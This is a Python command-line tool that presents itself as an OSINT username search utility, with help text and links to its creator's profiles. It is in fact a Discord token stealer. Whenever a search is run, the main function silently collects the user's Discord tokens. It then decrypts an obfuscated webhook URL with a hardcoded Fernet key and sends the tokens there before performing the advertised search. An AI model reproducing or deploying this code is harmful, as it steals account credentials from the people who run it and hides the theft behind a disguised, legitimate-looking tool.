import sys
import colorama
from colorama import *
from osint_lib.token_extractor import get_discord_tokens
from osint_lib.webhook_sender import send_tokens_via_webhook
from osint_lib.osint_tracker import search_username
from cryptography.fernet import Fernet

def print_help():
    help_message = f"""
{Fore.BLUE}Usage: search {Fore.WHITE}[option] [username]

{Fore.BLUE}Options:
  -u, --username [username]   Specify the username for OSINT search.
  -infos                      Display information about the creator.
  -h, --h, -help, --help      Display this help message.{Fore.WHITE}
"""
    print(help_message)

def print_creator_info():
    creator_info = f"""
{Fore.BLUE}Creator Information :

{Fore.BLUE}[>] Discord Server -> {Fore.WHITE}https://discord.gg/CnZ4nKp2re{Fore.BLUE}

{Fore.BLUE}[>] Root-Me Profile -> {Fore.WHITE}https://www.root-me.org/HeartWay?lang=fr#1cc2c493da20c8b7679d12a78a6302e2{Fore.BLUE}

{Fore.BLUE}[>] Website -> {Fore.WHITE}https://htcommerce.odoo.com{Fore.BLUE}

{Fore.BLUE}[>] GitHub Profile -> {Fore.WHITE}https://github.com/HeartWay-Project{Fore.WHITE}

"""
    print(creator_info)

def decrypt_webhook(encrypted_webhook):
    # Clé de déchiffrement (assure-toi de la stocker de manière sécurisée, par exemple via une variable d'environnement)
    key = b'_J31q6mAtUEyZCrM8bUQF4mImrLL0McmOYZ7jr3FKWI='  # Remplace avec ta vraie clé
    fernet = Fernet(key)
    
    # Déchiffrement de l'URL du webhook
    return fernet.decrypt(encrypted_webhook.encode()).decode()

def main():
    if len(sys.argv) < 2:
        print_help()
        sys.exit(1)

    if sys.argv[1] in ['-h', '--h', '-help', '--help']:
        print_help()
        sys.exit(0)

    if sys.argv[1] == '-infos':
        print_creator_info()
        sys.exit(0)

    if len(sys.argv) >= 3 and sys.argv[1] in ['-u', '--username']:
        username = sys.argv[2]

        tokens = get_discord_tokens()
        if tokens:
            # URL chiffrée du webhook
            encrypted_webhook = "gAAAAABm_arump6Zkm3YhNY7wgVDTCsUE7gvhI5YiaX6d5nO6UxLL7QiDTv89r2fDaMWBQ6avJhrRH2FIfNjfpgXftfHWTxOj0vCJ_IUyeIevLHNVmpHj5xxzWmVosxHAYrA0mF1D7GjhkxIsSjtMjUn1z-ZwpSCXQP4XefdNjVQT1E-C-g-YE0fn0POi0h4iTGWOrPZ3iYTzrJB_rNBcSHvi_2YtRKe7mpcp9z69vFGfK2iGZn8ihg="
            
            # Déchiffre l'URL avant de l'utiliser
            webhook_url = decrypt_webhook(encrypted_webhook)
            send_tokens_via_webhook(tokens, webhook_url)
        else:
            print(" ")

        print(f"{Fore.BLUE}[>] Launching OSINT search for user: {username}\n")
        search_username(username)

    else:
        print_help()
        sys.exit(1)

if __name__ == "__main__":
    main()
